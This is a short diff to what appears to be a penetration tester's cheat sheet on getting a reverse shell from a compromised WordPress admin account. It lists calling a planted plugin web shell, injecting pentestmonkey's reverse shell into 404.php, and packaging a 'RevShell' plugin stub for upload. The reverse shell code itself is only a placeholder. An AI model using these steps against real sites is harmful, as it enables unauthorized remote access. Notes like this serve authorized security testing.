@@ -183,6 +183,26 @@ Once got access get rev shell
 		curl http://wordpress-site/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
 		
 	2) Edit template editor -> 404.php and add pentestmonkey's reverse shell
+	
+	3) Create a plugin and upload
+		 <?php
+		/**
+		 * Plugin Name: RevShell
+		 * Version: 5.10.3
+		 * Author: Progfrog
+		 * Author URI: http://Progfrog.com
+		 * License: GPL2
+		 */
+		// PENTEST MONKEY REVERSE SHELL HERE
+		?>
+		
+		zip plugin.zip rev.php
+		
+		
+		Upload this plugin.zip into plugins and install and activate to get shell back
+		
+		
+		
 ===============
 base 64 stuffs
 ===============
